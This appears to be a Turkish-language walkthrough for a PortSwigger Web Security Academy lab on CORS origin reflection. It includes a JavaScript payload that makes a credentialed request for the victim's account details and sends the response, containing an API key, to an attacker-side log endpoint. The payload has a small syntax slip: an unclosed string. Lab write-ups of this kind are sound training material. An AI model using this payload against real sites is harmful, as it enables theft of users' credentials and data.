@@ -1,0 +1,24 @@
+LAB: CORS vulnerability with basic origin reflection
+
+1 - wiener:peter kullanıcısı ile giriş yapın. Burp Suite -> Proxy -> Http History -> /accountDetails -> Repeater
+Aşağıdaki headeri isteğe ekleyin.
+Origin: https://example.com
+
+2 - Cevap paketinin içinde Access-Control-Allow-Origin headeri bulunacaktır.
+
+3 - Exploit servere girerek aşağıdaki payloadı kurbana gönderin.
+
+<script>
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails/, true);
+	req.withCredentials = true;
+	req.send();
+
+	function reqListener() {
+		location = '/log?key=' + this.responseText;
+	};
+</script>
+
+4 - View exploit kısmından gelen cevapları inceleyin. GET /?log?key= ile başlayan cevapı URL DECODE ederek
+APIKEY'i kaydedin.
